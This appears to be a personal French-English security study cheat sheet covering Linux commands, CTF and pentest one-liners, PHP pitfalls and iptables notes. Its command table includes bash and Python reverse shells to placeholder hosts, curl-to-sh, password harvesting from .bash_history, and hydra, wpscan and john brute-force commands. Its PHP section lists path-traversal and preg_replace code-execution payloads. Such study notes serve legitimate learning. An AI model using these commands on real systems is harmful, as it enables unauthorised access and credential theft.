<p>
<em><strong>SCIENCE,HACKINGAND SECURITY</strong></em>
</p>

<ol>

<li><strong> Linux command</strong>
<ul>

<li>list
<ul>

<li><strong>chown [-option] [-utilisateur][-:groupe] cible1 [-cible2 ..] :</strong>
<p>

            <strong>Change le propriétaire et le groupe d’un fichier ou</strong>
</p>
<p>

            <strong>dossier.</strong>
</p>
<p>

            <strong>Exemple :</strong>
</p>
<p>

            <strong>chown linux:users file1</strong>
</p>
<p>

            <strong>This command will change the ownership of a file named <em>file1 </em>to a new owner named <em>linuxsize </em>and group <em>users</em>.</strong>
</p>
</li>
</ul>
</li>
</ul>
</li>
</ol>
<ul>

<li><strong>grep [-options] [-pattern] [-file] :</strong>
<p>

            <strong>The grep command is a filter that is used to search for lines matching a specified pattern.</strong>
</p>
<p>

            <strong>Exemple :</strong>
</p>
<p>

            <strong>grep “^hello” file1</strong>
</p>
<p>

            <strong>This command matches all lines that start with ‘hello’.</strong>
</p>
<ul>

<li><strong>ps [-options] :</strong>
<p>

            <strong>La commande ps affiche les processus machines en cours d'exécution.</strong>
</p>
</li>
</ul>
</li>
</ul>
<p>
<strong>			</strong>
</p>
<ul>

<li><strong>ldd [-options] [-file] :</strong>
<p>

            <strong>Cette commande (de l'anglais <em>List Dynamic Dependencies</em>) est un <a href="https://fr.wikipedia.org/wiki/Logiciel_utilitaire">utilitaire</a> <a href="https://fr.wikipedia.org/wiki/Unix">Unix</a> affichant les <a href="https://fr.wikipedia.org/wiki/Biblioth%C3%A8que_logicielle">bibliothèques logicielles partagées</a> d'un programme.</strong>
</p>
<ul>

<li><strong>printenv [--help] [--version] [variable…] :</strong>
</li>
</ul>
</li>
</ul>
<p>
<strong>			Affiche toutes les variables d'environnements.</strong>
</p>
<ul>

<li><strong>objdump [-options] [objfile…] :</strong>
</li>
</ul>
<p>
<strong>			This command is used to provide thorough information on </strong>
</p>
<p>

        <strong>object files.</strong>
</p>
<p>

        <strong>Options :</strong>
</p>
<ul>

<li><strong>-TC : Peut servir à observer les fonctions utilisées dans un fichier exécutable.</strong>
</li>
</ul>
<p>
<strong>			</strong>
</p>
<ul>

<li><strong>size [-options] [objfile…] :</strong>
</li>
</ul>
<p>
<strong>		Permet de connaître les différentes sections d'un programme </strong>
</p>
<p>

        <strong>et de leur adresse mémoire.</strong>
</p>
<ul>

<li><strong>strace [option] command :</strong>
</li>
</ul>
<p>

            <strong>The strace command in Linux lets you trace system calls and signals (ltrace do almost the same).</strong>
</p>
<p>

        <strong>Options :</strong>
</p>
<ul>

<li><strong>-c : print in summary</strong>

<li><strong>-n : all system calls</strong>
</li>
</ul>
<ul>

<li><strong>wc [option].. [entry].. :</strong>
<p>

            <strong>wc stands for word count. Command for printing newline, word and byte counts for files.</strong>
</p>
<p>

            <strong>Example:</strong>
</p>
<p>

            
<img src="images/image1.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ul>

<li><strong>“4” : number of characters.</strong>

<table>
  <tr>
   <td>
<strong>1</strong>
</li>
</ul>
</li>
</ul>
   </td>
   <td><strong>1</strong>
   </td>
   <td><strong>4</strong>
   </td>
  </tr>
  <tr>
   <td><strong>number of lines</strong>
   </td>
   <td><strong>number of words</strong>
   </td>
   <td><strong>number of bytes</strong>
   </td>
  </tr>
</table>


<ul>

<li><strong>fg [cible]:</strong>
<p>

            <strong>The fg command switches a job running in the background into the foreground. Can be used with “&” ( put in background and then put in foreground ).</strong>
</p>
</li>
</ul>
<ul>

<li><strong>file [FILE]:</strong>
</li>
</ul>
<p>
<strong> 			Print the file type:</strong>
</p>
<p>
<strong>			</strong>
</p>
<ul>

<li><strong>strip [options] [FILE] :</strong>
<p>

            <strong>﻿The strip command discards symbols from compiled object <a href="https://www.computerhope.com/jargon/o/objefile.htm">files</a>. ﻿It can also be useful for making it more difficult to reverse-engineer the<a href="https://www.computerhope.com/jargon/c/compile.htm"> compiled code</a>.</strong>
</p>
<ul>

<li><strong>readelf [options] [ELF-FILE]</strong>
<p>

            <strong>readelf displays information about one or more ELF format object files. The options control what particular information to display.</strong>
</p>
</li>
</ul>
</li>
</ul>
<ul>

<li><strong>hachoir-subfile [FILE] :</strong>
</li>
</ul>
<p>

            <strong>Extrait des fichiers (non compressés, non chiffrés et non fragmentés) contenus dans d'autres fichiers.</strong>
</p>
<ul>

<li><strong>su [USER_NAME] :</strong>
</li>
</ul>
<p>

            <strong>Switch the current user.</strong>
</p>
<ul>

<li><strong>pstree [OPTIONS] :</strong>
</li>
</ul>
<p>

            <strong>Affiche l’arborescence des processus.</strong>
</p>
<ul>

<li><strong>mktemp [OPTIONS] ... :</strong>
</li>
</ul>
<p>

            <strong>Create a temporary file or directory.</strong>
</p>
<ul>

<li><strong>trap [OPTIONS] ... :</strong>
</li>
</ul>
<p>

            <strong>Defines and activates handlers to be run when the shell receives signals or other special conditions..</strong>
</p>
<p>
<strong>Some useful commands and tool :</strong>
</p>

<table>
  <tr>
   <td><strong>tail --bytes=+425 crackme_wtf > Crackmew</strong>
   </td>
   <td><strong>Write the file “crackme_wtf” from the 425 bytes in a file named “Cracknew”.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>man 3 [SYSTEM_FUNCTION]</strong>
   </td>
   <td><strong>Display the prototype of the function</strong>
   </td>
  </tr>
  <tr>
   <td><strong>uftrace --force -a ./random</strong>
   </td>
   <td><strong>Detect dynamic library calls</strong>
   </td>
  </tr>
  <tr>
   <td><strong>objdump -d [FILE]</strong>
   </td>
   <td><strong>Display assembler contents of executable sections</strong>
   </td>
  </tr>
  <tr>
   <td><strong>export -n [ENV_VAR]</strong>
   </td>
   <td><strong>Supprime la variable d'environnement</strong>
   </td>
  </tr>
  <tr>
   <td><strong>readelf -d [FILE_PATH] | grep -e RPATH -e RUNPATH</strong>
   </td>
   <td><strong>Read the dynamic section to extract the RPATH/RUNPATH.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>objdump -x [FILE_PATH] | grep RPATH</strong>
   </td>
   <td><strong>to check if an application uses RPATH options.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>objdump -x [FILE_PATH] | grep RUNPATH</strong>
   </td>
   <td><strong>to check if an application uses RUNPATH options.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>cat [FILE1] > [FILE2]</strong>
   </td>
   <td><strong>Copier le contenu d’un fichier dans un autre en l'écrasant ( “>>” pour pas l’écraser )</strong>
   </td>
  </tr>
  <tr>
   <td><strong>sudo -u [USER_NAME] [FILE_EXECUTED]</strong>
   </td>
   <td><strong>Executer un fichier avec un autre utilisateur</strong>
   </td>
  </tr>
  <tr>
   <td><strong>﻿COMMAND bash : nm ./binary15 | grep "shell"</strong>
   </td>
   <td><strong>Affiche l’adresse de la fonction “shell” du programme “binary15”.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>./ch7 ﻿ `python -c "print 'a'*512"`</strong>
   </td>
   <td><strong>Forge l'argument pour le programme “ch7” avec une syntax python.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>objdump -s ch7</strong>
   </td>
   <td><strong>Display the full contents of all sections requested of ch7 file</strong>
   </td>
  </tr>
  <tr>
   <td><strong>export CHALL=$( echo -n -e '\x96\x55' )</strong>
   </td>
   <td><strong>Write Bytes en Bash</strong>
   </td>
  </tr>
  <tr>
   <td><strong>mv toto.php test</strong>
   </td>
   <td><strong>Move toto.php to the directory “test”</strong>
   </td>
  </tr>
  <tr>
   <td><strong>ls -a</strong>
   </td>
   <td><strong>Print hidden file</strong>
   </td>
  </tr>
  <tr>
   <td><strong>find /home -name .bash_history</strong>
   </td>
   <td><strong>Search for all the files named .bash_history in the /home directory</strong>
   </td>
  </tr>
  <tr>
   <td><strong>find /home -name .bashrc -exec grep [PATTERN] {} \;</strong>
   </td>
   <td><strong>Search for all the files named .bashrc in the /home directory and then </strong>
<p>
<strong>for each file, extract [PATTERN] word inside it.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>find . -name .bash_history -exec grep -A 1 '^passwd' {} \;</strong>
   </td>
   <td><strong>Search for all the files named .bash_history in the .directory.</strong>
<p>
<strong>for each file, extract “passwd” word inside it in case it is placed first in the line (“^”) and print one more following line (“-A 1).</strong>
<p>
<strong>Utile si quelqu’un a utilisé la commande passwd puis écrit son mot de passe dans le terminal.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>ls -ld [DIRECTORY]</strong>
   </td>
   <td><strong>print permission on a directory</strong>
   </td>
  </tr>
  <tr>
   <td><strong>tar -xzvf [ FILE ][tar.gz | tgz ]</strong>
   </td>
   <td><strong>Décompresser le fichier file de type tar.gz ou tgz.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>tar -jxvf [ FILE ].tbz</strong>
   </td>
   <td><strong>Décompresser le fichier file de type tbz.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>echo -n "OR9hcp18+C1bChK10NlRRg==" | base64 -D | hexdump -C</strong>
   </td>
   <td><strong>décode la chaîne de caractère en base64 puis l’affiche en Hexa</strong>
   </td>
  </tr>
  <tr>
   <td><strong>python -m SimpleHTTPServer</strong>
   </td>
   <td><strong>Ouvre un serveur web rapidement</strong>
   </td>
  </tr>
  <tr>
   <td><strong>find / -writeable -type d 2>/dev/null</strong>
   </td>
   <td><strong>Afficher tous les fichiers autorisés en écriture.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>bash -i >& /dev/tcp/[HOST]/[PORT] 0>&1</strong>
   </td>
   <td><strong>Reverse shell in bash</strong>
   </td>
  </tr>
  <tr>
   <td><strong>python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("&lt;IP>",&lt;PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/</strong>
<p>
<strong>bin/sh","-i"]);'</strong>
   </td>
   <td><strong>reverse shell en python ( exécution bash )</strong>
   </td>
  </tr>
  <tr>
   <td><strong>python -c "import pty;pty.spawn('/bin/bash')"</strong>
   </td>
   <td><strong>Avoir une bonne interface sur le shell</strong>
   </td>
  </tr>
  <tr>
   <td><strong>mv [FILE1] [FILE2]</strong>
   </td>
   <td><strong>rename a file</strong>
   </td>
  </tr>
  <tr>
   <td><strong>curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh</strong>
   </td>
   <td><strong>Install and Run linpeas.sh</strong>
   </td>
  </tr>
  <tr>
   <td><strong>john --wordlist=/usr/share/wordlists/rockyou.txt shadowfile</strong>
   </td>
   <td><strong>Brute les hash du fichier /etc/shadow</strong>
   </td>
  </tr>
  <tr>
   <td><strong>sqlmap -r [FILE] --dbs --batch</strong>
<p>
<strong>sqlmap -r [FILE] -D [DATABASE_NAME] -T [TABLES_NAMES] --dump --batch</strong>
   </td>
   <td><strong>sqlmap avec un fichier ou se retrouve la forme de la requête avec les paramètre</strong>
<p>
<strong>qu’on essaye d’exploiter.</strong>
<p>
<strong>-D : vise une database précise.</strong>
<p>
<strong>-T : table précise</strong>
   </td>
  </tr>
  <tr>
   <td><strong>hydra -L [wordlist_user] -P [wordlist_passwd] [IP/DOMAINE] -f </strong>
<p>
<strong>http-get [URL_OF_LOGIN_PAGE]</strong>
   </td>
   <td><strong>BruteForce a certain login page o</strong>
   </td>
  </tr>
  <tr>
   <td><strong>dirb [URL] -u [USERNAME:PASSWD]</strong>
<p>
<strong>-X [.EXTENSION,.EXTENSION,...]</strong>
   </td>
   <td><strong>bruteforce un URL accessible avec un username/passwd </strong>
   </td>
  </tr>
  <tr>
   <td><strong>echo "[HEXA_STRING]" | xxd -p -r</strong>
   </td>
   <td><strong>Convertir une chaîne hexadécimale en ASCII</strong>
   </td>
  </tr>
  <tr>
   <td><strong>hydra -l root -P /usr/share/wordlists/rockyou.txt &lt;IP> mysql</strong>
   </td>
   <td><strong>brute password sur mysql avec hydra ( sur le port ouvert pour )</strong>
<ul>

<li><strong>l : username</strong>

<li><strong>P : password to test</strong>
</li>
</ul>
   </td>
  </tr>
  <tr>
   <td><strong>mysql -h &lt;IP> -u root -p robert</strong>
   </td>
   <td><strong>Se connecte sur la database mysql de l'hôte &lt;IP> avec le compte root et le mot de passe robert</strong>
   </td>
  </tr>
  <tr>
   <td><strong>gobuster dir -u [IP_ADDRESS] -w /usr/share/dirb/wordlists/common.txt -x php,php.bak,html,txt,bak,old -s 200</strong>
   </td>
   <td>
<ul>

<li><strong>dir : mode bruteforce sur les directories </strong>
<strong>Bruteforce by specific some extensions</strong>
<p>

<img src="images/image2.png" width="" alt="alt_text" title="image_tooltip">

</li>
</ul>
   </td>
  </tr>
  <tr>
   <td><strong>gobuster vhost -u [IP_ADDRESS] -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt | grep "Status: 200"</strong>
   </td>
   <td><strong>In vhosts mode the tool is checking if the subdomain exists by visiting the formed url and verifying the IP address.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>/usr/share/john/ssh2john.py [RSA/DSA/EC/OpenSSH private key file(s)]</strong>
   </td>
   <td><strong>Convert the private encrypted keys in the file provided into a crackable hash for John ( to find ssh password for example ).</strong>
   </td>
  </tr>
  <tr>
   <td><strong>pspy64s</strong>
   </td>
   <td><strong>Help us enumerate pesky files or permission of different files across the system.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>scp '-P [PORT]' [REMOTE_HOST_NAME]@[IP]:[PATH_FILE] [INTERN_PATH]</strong>
<p>
<strong>exemple : scp '-P 2221' [SOURCE] [DESTINATION]</strong>
<p>
<strong>scp '-P 2225' app-systeme-ch73@challenge05.root-me.org:/challenge/app-systeme/ch73/ch73.exe /home/kali</strong>
   </td>
   <td><strong>Télécharger un fichier depuis un machine distante SSH</strong>
   </td>
  </tr>
  <tr>
   <td><strong>unzip myfile.zip</strong>
   </td>
   <td><strong>Dézipper un file .zip</strong>
   </td>
  </tr>
  <tr>
   <td><strong>hydra -L [USERS_WORDLIST_FILE] -p [PASSWD] [IP] ssh</strong>
   </td>
   <td><strong>BruteForce ssh credentials with one password</strong>
   </td>
  </tr>
  <tr>
   <td><strong>netdiscover</strong>
<p>
<strong>arp-scan --localnet</strong>
   </td>
   <td><strong>Découvre toutes les hosts dans un même réseau.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>wpscan --url “[URL]” --enumerate</strong>
   </td>
   <td><strong>Trouver des vulnérabilité si il y a Wordpress utiliser</strong>
   </td>
  </tr>
  <tr>
   <td><strong>wpscan --url “[URL]” -U [USER_NAME] -P [WORDLIST]</strong>
   </td>
   <td><strong>Bruteforcer le mdp d’un user sur wordpress</strong>
   </td>
  </tr>
  <tr>
   <td><strong>cewl</strong>
<p>
<strong>cewl “[URL]” > cewl3.txt</strong>
   </td>
   <td><strong>CeWL is a ruby app which spiders a given url to a specified depth, optionally following external links, and returns a list of words which can then be used for password crackers such as John the Ripper</strong>
   </td>
  </tr>
  <tr>
   <td><strong>tr -d ‘\n’ [TEXT]</strong>
   </td>
   <td><strong>Remove ‘\n’ from the input text.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>sudo update-alternatives --config java</strong>
   </td>
   <td><strong>Changer la configuration de java</strong>
   </td>
  </tr>
  <tr>
   <td><strong>ftp [IP]</strong>
   </td>
   <td><strong>Se connecter sur le port Ftp</strong>
   </td>
  </tr>
  <tr>
   <td><strong>dig @[IP] [DOMAIN] axfr</strong>
   </td>
   <td><strong>Can help to find subdomain on a given domain</strong>
   </td>
  </tr>
  <tr>
   <td><strong>dirsearc</strong>h
   </td>
   <td><strong>For Directory brute forcing</strong>
   </td>
  </tr>
  <tr>
   <td><strong>“Firefox_Decrypt”</strong>
   </td>
   <td><strong>Obtain credentials of FireFox navigateur from it directory on Linux</strong>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td><strong>nikto -h http://192.168.1.103/dav/</strong>
   </td>
   <td><strong>Nikto is a popular Web server scanner that tests Web servers for dangerous files/CGIs, outdated server software and other issues. It also performs generic and server type specific checks</strong>
<p>
<strong>Also Provide if HTTP PUT method is allowed.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>cadaver [URL/dav/]</strong>
<p>
<strong>{ CAVAVER_INTERFACE : }put [REVERSE_SHELL.PHP]</strong>
   </td>
   <td><strong>Cadaver is a command line that enables the uploading and downloading of a file on WebDAV.</strong>
<p>
<strong>To verify whether the file is uploaded or not, run the URL: [URL]/dav/ on the browser.</strong>
<p>

<img src="images/image3.png" width="" alt="alt_text" title="image_tooltip">

   </td>
  </tr>
  <tr>
   <td><strong>php -S localhost:8000</strong>
   </td>
   <td><strong>Serveur php</strong>
   </td>
  </tr>
  <tr>
   <td><strong>knock [IP] 7469 8475 9842 .. [PORT]</strong>
   </td>
   <td><strong>Effectue une séquence pour le “Port knocking “ Après que la bonne séquence est effectuée, le port en question s’ouvre ( n’est plus filtered . </strong>
   </td>
  </tr>
  <tr>
   <td><strong>fcrackzip -u -D -p '/usr/share/wordlists/rockyou.txt' numbers.zip</strong>
   </td>
   <td><strong>bruteforce zip password</strong>
   </td>
  </tr>
  <tr>
   <td><strong>crunch &lt;min> &lt;max> [OPTIONS …]</strong>
   </td>
   <td><strong>Generate Custom wordlist :</strong>
<p>
<strong>“&lt;min>&lt;max>” : size of the generated words</strong>
   </td>
  </tr>
  <tr>
   <td><strong>gcc … -static ….</strong>
   </td>
   <td><strong>L’option static dans les paramètres de compilation permet en quelque sorte d’intégrer les bibliothèques dynamiques à notre binaire plutôt que de faire une liaison. </strong>
<p>
<strong>La conséquence est que le binaire aura une taille plus conséquente. </strong>
<p>
<strong>Cela rend une attaque de type ROP largement plus facile à effectuer. :)</strong>
   </td>
  </tr>
  <tr>
   <td><strong>chisel [OPTIONS]</strong>
   </td>
   <td><strong>Chisel is a fast TCP tunnel, transported over HTTP, secured via SSH</strong>
   </td>
  </tr>
  <tr>
   <td><strong>showmount -e 192.168.10.10</strong>
   </td>
   <td><strong>showmount command shows information about an NFS server</strong>
<p>
<strong>-e : Print the list of exported filesystems</strong>
   </td>
  </tr>
  <tr>
   <td><strong>XSSstrike</strong>
   </td>
   <td><strong>Puissant Scanner de XSS</strong>
   </td>
  </tr>
  <tr>
   <td><strong>find . -name \*.xml</strong>
   </td>
   <td><strong>Find all XML file in current directory </strong>
   </td>
  </tr>
  <tr>
   <td><strong>ln -s [chemin/vers/le/dossier/existant] </strong>
   </td>
   <td><strong>Create a symbolic link</strong>
   </td>
  </tr>
  <tr>
   <td><strong>Mono [FILE.EXE] --options</strong>
   </td>
   <td><strong>Execute .exe on linux</strong>
   </td>
  </tr>
  <tr>
   <td><strong>chaosreader [FILE.PCAP]</strong>
   </td>
   <td><strong>This tool will analyze and extract session information and files from .PCAP</strong>
   </td>
  </tr>
  <tr>
   <td><strong>http://domxssscanner.geeksta.net</strong>
   </td>
   <td><strong>DOM based sink scanner</strong>
   </td>
  </tr>
  <tr>
   <td><strong>searchsploit -w [MOT_GREP] [MOT_GREP] [MOT_GREP]</strong>
   </td>
   <td><strong>search vulnérabilité pour les mots recherchées ( linux, DB, … ) en affichant le liens vers exploit-db</strong>
   </td>
  </tr>
  <tr>
   <td><strong>searchsploit [MOT_GREP] [MOT_GREP] [MOT_GREP]</strong>
   </td>
   <td><strong>search vulnérabilité pour les mots recherchées ( linux, DB, … ) en affichant le path ( sur Kali ) vers un fichier.c pour effectuer l’exploitation de la vuln.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>hash-identifier</strong>
   </td>
   <td><strong>Pour Identifier le type d’un hash</strong>
   </td>
  </tr>
  <tr>
   <td><strong>ht</strong>
   </td>
   <td><strong>editeur cool sur linux ( fonctionne avec les touches F1,F2,F3,... )</strong>
   </td>
  </tr>
  <tr>
   <td>tar -zcvf shell.tar.gz shell.php
   </td>
   <td>to tar and zip the reverse shell file
   </td>
  </tr>
  <tr>
   <td><strong>sudo passwd [nom_utilisateur]</strong>
   </td>
   <td><strong>changer le mdp d’un utilisateur</strong>
   </td>
  </tr>
  <tr>
   <td><strong>zip -r [OUTPUTFILE] [DIR]</strong>
   </td>
   <td><strong>Zipper un dossier</strong>
   </td>
  </tr>
  <tr>
   <td><strong>aquatone</strong>
   </td>
   <td><strong>Find subdomains, port scan , discover vuln ...</strong>
   </td>
  </tr>
  <tr>
   <td><strong>sudo netstat -plten | grep [PORT]</strong>
<p>
<strong>kill -9  [PROCESS_ID]</strong>
   </td>
   <td><strong>Kill a process running on a port</strong>
   </td>
  </tr>
  <tr>
   <td><strong>hydra -V -f -L /root/Desktop/user.txt -P /root/Desktop/dict.txt rdp://192.168.0.102</strong>
   </td>
   <td><strong>Bruteforce RDP</strong>
   </td>
  </tr>
  <tr>
   <td><strong>(python -c "print 'a'*50";cat) | ./ch65</strong>
   </td>
   <td><strong>argument pour la fonction read</strong>
   </td>
  </tr>
  <tr>
   <td><strong>dmesg</strong>
   </td>
   <td><strong>commande sur les systèmes d'exploitation de type Unix qui affiche la mémoire tampon de message du noyau.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>lsmod</strong>
   </td>
   <td><strong>Connaître tous les modules du kernel actifs ( Un module est un morceau de code permettant d'implémenter des fonctionnalités au noyau ).</strong>
<p>
<strong>Les modules sont exécutés dans l'espace mémoire du noyau.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>modinfo [ NAME_MODULE]</strong>
   </td>
   <td><strong>get info on kernel module</strong>
   </td>
  </tr>
  <tr>
   <td><strong>ps -eaf</strong>
   </td>
   <td><strong>check the processes running on a machine</strong>
   </td>
  </tr>
  <tr>
   <td><strong>capsh --print</strong>
   </td>
   <td><strong>Check the capabilities provided in a docker container</strong>
   </td>
  </tr>
  <tr>
   <td><strong>fdisk -l</strong>
   </td>
   <td><strong>List the disks on the local machine.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>chroot ./ [COMMAND]</strong>
   </td>
   <td><strong>La commande chroot permet de changer le répertoire racine vers un nouvel emplacement.</strong>
<p>
<strong>COMMAND : command to execute just after chroot.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>nc -v -n -w2 -z [IP] 1-65535</strong>
   </td>
   <td><strong>alternative to scan port without nmap ( with netcat )</strong>
   </td>
  </tr>
  <tr>
   <td><strong>nc 172.17.0.1 2222</strong>
   </td>
   <td><strong>Identify the service running on port 2222 on the machine with the IP address 172.17.0.1.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>cat sshd_config | grep PermitRootLogin</strong>
   </td>
   <td><strong>Check whether SSH root login is permitted</strong>
   </td>
  </tr>
  <tr>
   <td><strong>sessions </strong>
   </td>
   <td><strong>MSFCONSOLE : list all sessions</strong>
   </td>
  </tr>
  <tr>
   <td><strong>sessions -i 1</strong>
   </td>
   <td><strong>MSFCONSOLE : enter in meterpreter mode on a session.</strong>
   </td>
  </tr>
  <tr>
   <td>zip2john chall.zip > zippy
<p>
john zippy --wordlist=/usr/share/wordlists/rockyou.txt
   </td>
   <td>Brute force ZIP file.
   </td>
  </tr>
  <tr>
   <td>nbtscan-1.0.35.exe 192.168.1.0/24
   </td>
   <td>Scan Netbios name and dc
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
</table>


<ul>

<li>Nmap commands
</li>
</ul>
<p>

<img src="images/image4.png" width="" alt="alt_text" title="image_tooltip">

</p>
<ol>

<li> About PHP

<li>PHP - Difference between ‘ and “:
</li>
</ol>
<p>
<strong>			Single-quoted strings doesn’t consider special case ( like ‘$’ for</strong>
</p>
<p>

        <strong>variable,‘\n’ for newline ,..).</strong>
</p>
<p>

        <strong>Double-quoted strings are considered special cases.</strong>
</p>
<p>

            <strong>﻿So for the performance people: use single quote.</strong>
</p>
<ul>

<li><strong>This language is written in “C”.</strong>
</li>
</ul>
<ul>

<li>PHP - Path and dot truncation :
</li>
</ul>
<p>
<strong>			On most PHP installations, a filename longer than 4096</strong>
</p>
<p>

        <strong>bytes will be cut off so any excess chars will be thrown </strong>
</p>
<p>

        <strong>away.</strong>
</p>
<p>

        <strong>Example :</strong>
</p>
<p>

<strong>http://example.c<code>om/index.php?page=../../../etc/passwd............[ADD MORE]</code></strong>




<pre class="prettyprint">http://example.com/index.php?page=../../../etc/passwd\.\.\.\.\.\.[ADD MORE]
http://example.com/index.php?page=../../../etc/passwd/./././././.[ADD MORE] 
http://example.com/index.php?page=../../../[ADD MORE]../../../../etc/passwd
</pre>


<ul>

<li>PHP - Loose comparaison :
<p>

            <strong>Faire attention à utiliser “===” à la place de “==” sur des comparaisons sensibles ( voir tableau associé ).</strong>
</p>
<p>

            <strong>	      Examples Loose comparaison</strong>
</p>

<table>
  <tr>
   <td>
<strong>5 == “5”</strong>
</li>
</ul>
   </td>
   <td><strong>PHP will attempt to convert the string to an integer, meaning that 5 == "5" evaluates to true. </strong>
   </td>
  </tr>
  <tr>
   <td><strong>5 == "5 of something"</strong>
   </td>
   <td><strong>﻿PHP will effectively convert the entire string to an integer value based on the initial number. The rest of the string is ignored completely.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>0 == "Example string"</strong>
   </td>
   <td><strong>Evaluated true. PHP treats this entire string as the integer 0.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>TRUE == "Example string"</strong>
   </td>
   <td><strong>Evaluated true.</strong>
   </td>
  </tr>
  <tr>
   <td><strong>'0e1' == '00e2'== '0e1337'(que des nombre après le “e”) == '0'</strong>
   </td>
   <td><strong>“0e[NOMBRE]” est traité par PHP comme 0 à la puissance [NOMBRE]</strong>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
  <tr>
   <td>
   </td>
   <td>
   </td>
  </tr>
</table>


<ul>

<li>PHP - preg_replace exploit :
<p>

        <strong>Exemple : ﻿<a href="http://www.php.net/preg_replace">preg_replace</a>("/a/e","print_r(scandir('.'))","abcd");</strong>
</p>
<ul>

<li><strong>Sur cette exemple, la commande change la lettre “<em>a</em>” dans “<em>abcd</em>” par l'expression du milieu.</strong>
<p>

        <strong>	</strong>
</p>
<ul>

<li><strong>le “/e” sur le premier champ permet d'exécuter la commande sur le champ de au milieu.</strong>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>
<strong>		</strong>
</p>
<p>
<strong>Le rôle de PHP est de générer du code HTML, code qui est ensuite envoyé au client de la même manière qu'un site statique.</strong>
</p>
<ul>

<li><strong>Parmi les concurrents de PHP, on peut citer les suivants : </strong> 
<ul>
 
<li><strong>ASP.NET ( bien connu des développeurs C# ).</strong>
 
<li><strong>Ruby on Rails ( utilise avec le langage Ruby ).</strong>
 
<li><strong>Django ( utilise le langage python ).</strong>
 
<li><strong>[JSP, JRE, …] pour le langage JAVA.</strong>
</li> 
</ul>
</li> 
</ul>
<ul>

<li>
<img src="images/image5.png" width="" alt="alt_text" title="image_tooltip">

</li>
</ul>
<ul>

<li>Cookies vs. sessions ( no PHP ) :
</li>
</ul>
<p>

<img src="images/image6.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>

<img src="images/image7.png" width="" alt="alt_text" title="image_tooltip">

</p>
<p>
<strong>An implementation :</strong>
</p>
<p>
<strong>Store a unique cookie value on the client, and store persistent data in the database along with that cookie value. Then on page requests I matched up those values and had my persistent data without letting the client control what that was.</strong>
</p>
<ol>

<li> Iptables
</li>
</ol>
<ul>

<li><strong>Iptables can be run only by root.</strong>
</li>
</ul>
<ul>

<li><strong>Netfilter CHAINS :</strong> 
<ul>
 
<li><strong>INPUT : used for filtering incoming packets. Out host is the packet destination</strong>
 
<li><strong>OUTPUT : used for filtering outgoing packets. Our host is the source of the packet.</strong>
 
<li><strong>FORWARD : used for filtering routed packets. Our host is router.</strong>
 
<li><strong>PREROUTING : used for DNAT / Port Forwarding.</strong>
 
<li><strong>POSTROUTING : used for SNAT ( MASQUERADE ).</strong>
<ul>

<li><strong>You can create your own chain.</strong>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<ul>

<li><strong>Using a name domain on the rule could not block the connection to the target site because they may use multiple IP addresses for one domain and you only filtered one or some.</strong>
</li>
</ul>
<ul>

<li><strong>Netfilter Tables:</strong> 
<ul>
 
<li><strong>filter : </strong>  
<ul>
  
<li><strong>Default table for Iptables.</strong>
  
<li><strong>Where the decision of accepting or dropping packets is taken.</strong>
  
<li><strong>Built-in chains : INPUT, OUTPUT and FORWARD.</strong>
</li>  
</ul>
 
<li><strong>nat :</strong>  
<ul>
  
<li><strong>Specialized for SNAT and DNAT (Port forwarding)</strong>
  
<li><strong>Built-in chains : PREROUTING, POSTROUTING and OUTPUT ( for locally generated packets).</strong> 
<ul>
 
<li><strong>mangle :</strong>  
<ul>
  
<li><strong>Specialized for packet alteration ( on headers, …).</strong>
  
<li><strong>Built-in chains : All.</strong> 
<ul>
 
<li><strong>raw :</strong>  
<ul>
  
<li><strong>Stateful table</strong>
  
<li><strong>Built-in chains : PREROUTING and OUTPUT.</strong>
  
<li><strong>Use to set a mark on packets that should not be handled by the connection tracking system</strong>
</li>  
</ul>
</li>  
</ul>
</li>  
</ul>
</li>  
</ul>
</li>  
</ul>
</li>  
</ul>
</li>  
</ul>
<ul>

<li><strong>We can redefine the default chain policy that is applied after all rules were executed.</strong>
</li>
</ul>
<ul>

<li><strong>The order used for the rules is very important in the process.</strong>
</li>
</ul>
<p>
<strong>	</strong>
</p>
<ul>

<li><strong>Netfilter command :</strong> 
<ul>
 
